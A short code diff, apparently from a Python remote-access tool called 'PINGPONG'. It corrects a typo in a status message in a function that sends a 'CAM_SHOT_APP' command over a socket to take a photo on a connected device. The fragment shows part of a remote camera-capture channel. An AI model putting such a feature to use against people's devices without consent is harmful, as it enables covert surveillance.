@@ -8,7 +8,7 @@ sys.path.append("..")
 from main import print_good, print_normal
 #拍照功能
 def cam_shot(sendobj, conn):
-    print_normal("PINGPPONG>[*]Starting......")
+    print_normal("PINGPONG>[*]Starting......")
     sendobj.App_send("CAM_SHOT_APP", False, conn)
     len_data = conn.recv(1024)
     conn.send(bytes("OK", 'utf8'))
